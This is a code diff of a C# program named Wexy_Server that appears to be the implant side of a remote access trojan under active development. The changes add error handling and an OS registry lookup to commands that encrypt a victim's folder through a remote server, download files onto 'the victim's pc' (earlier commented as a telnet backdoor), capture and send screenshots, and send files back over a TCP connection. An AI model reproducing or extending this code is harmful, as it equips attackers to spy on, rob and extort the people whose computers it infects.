@@ -12,6 +12,7 @@ using System.Diagnostics;
 using Open.Nat;
 using System.Threading.Tasks;
 using System.Threading;
+using Microsoft.Win32;
 
 
 namespace Wexy_Server
@@ -24,6 +25,21 @@ namespace Wexy_Server
         public static System.Threading.Thread Rec;
         public static TcpClient client;
         public static int port = 1702;
+
+
+        public static string GetWindowsPlatform()
+        {
+            OperatingSystem os = System.Environment.OSVersion;
+           // Console.WriteLine("OS Platform: {0}", os.Platform);
+            //Console.WriteLine("OS Service Pack: {0}", os.ServicePack);
+            //Console.WriteLine("OS Version: {0}", os.VersionString);
+            String subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
+            RegistryKey key = Registry.LocalMachine;
+            RegistryKey skey = key.OpenSubKey(subKey);
+           // Console.WriteLine("OS Name: {0}", skey.GetValue("ProductName"));
+            return skey.GetValue("ProductName").ToString();
+        }
+
 
         public static void ReceiveCommands()
         {
@@ -149,27 +165,49 @@ namespace Wexy_Server
 
         #region Commands
 
+        // - ALMOST OK - 
         public static void EncryptFolder(string folderpath, string serverUrl)
         {
-            RCSLock rcs = new RCSLock();
-            rcs.startAction(folderpath,serverUrl);
+            try
+            {
+                RCSLock rcs = new RCSLock();
+                rcs.startAction(folderpath, serverUrl);
+            }
+            catch
+            {
+                string message = "An error has occured while trying to encrypt the folder. Make sure the web server is running and verify the folder's path";
+                byte[] Packet = Encoding.ASCII.GetBytes(message);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }
         }
 
+        // - ALMOST OK - 
         public static void DownloadFile(string url, string fileName)
         {
-            //Download and run telnet backdoor
-            WebClient wb = new WebClient();
-            wb.DownloadFile(url, fileName);
+            //Remote download on the victim's pc
+            try
+            {
+                WebClient wb = new WebClient();
+                wb.DownloadFile(url, fileName);
+            }
+            catch
+            {
+                string message = "An error has occured while trying to remote download the file";
+                byte[] Packet = Encoding.ASCII.GetBytes(message);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }        
         }
 
-        // - ALMOST OK - [NOT TESTED YET] 
+        // - ALMOST OK - 
         public static void KillWexy()
         {
             //RemoveFromStartup();
             Environment.Exit(0);
         }
 
-        // - ALMOST OK - [Files are not completely downloaded, also it changes the stream bytes]
+        // - ALMOST OK - [Sometimes the picture is not fully downloaded]
         public static void SendScreenshot()
         {
             Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -192,12 +230,13 @@ namespace Wexy_Server
             Stream s = client.GetStream();
             byte[] filebytes = File.ReadAllBytes(filePath);
             s.Write(filebytes, 0, filebytes.Length);
+            
         }
        
         // - ALMOST OK - 
         public static void getOSVersion()
         {
-            string osversion = Environment.OSVersion.ToString();
+            string osversion = GetWindowsPlatform();
             byte[] Packet = Encoding.ASCII.GetBytes(osversion);
             Writer.Write(Packet, 0, Packet.Length);
             Writer.Flush();
